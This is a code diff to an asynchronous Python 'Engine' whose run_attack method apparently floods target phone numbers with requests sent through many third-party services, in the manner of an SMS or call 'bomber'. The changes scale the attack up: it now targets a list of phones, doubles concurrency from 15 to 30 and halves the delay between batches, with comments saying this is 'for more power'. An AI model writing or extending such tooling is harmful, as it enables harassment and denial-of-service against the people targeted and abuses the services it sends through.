@@ -9,7 +9,7 @@ class Engine:
     def __init__(self, services: List[BaseService]):
         self.services = services
         self._session: Optional[aiohttp.ClientSession] = None
-        self._semaphore = asyncio.Semaphore(15) # Reduced for 0.1 CPU limit
+        self._semaphore = asyncio.Semaphore(30) # Increased for "more powerful" engine
 
     async def get_session(self) -> aiohttp.ClientSession:
         if self._session is None or self._session.closed:
@@ -30,7 +30,7 @@ class Engine:
 
     async def run_attack(
         self, 
-        phone: str, 
+        phones: List[str], 
         batches: int, 
         selected_service_names: Optional[List[str]] = None,
         on_progress: Optional[Callable[[int, int, int, int], Any]] = None
@@ -49,11 +49,12 @@ class Engine:
         total_failed = 0
 
         for i in range(1, batches + 1):
-            logger.info(f"Starting batch {i}/{batches} for {phone}")
+            logger.info(f"Starting batch {i}/{batches} for {len(phones)} targets")
             
             tasks = []
-            for service in target_services:
-                tasks.append(self._guarded_send(service, session, phone))
+            for phone in phones:
+                for service in target_services:
+                    tasks.append(self._guarded_send(service, session, phone))
             
             results = await asyncio.gather(*tasks)
             
@@ -70,7 +71,8 @@ class Engine:
                     on_progress(i, batches, batch_success, batch_failed)
             
             if i < batches:
-                delay = 2 # Fixed or configurable delay
+                # Reduced delay for more power
+                delay = 1 
                 logger.debug(f"Waiting {delay}s before next batch")
                 await asyncio.sleep(delay)
 
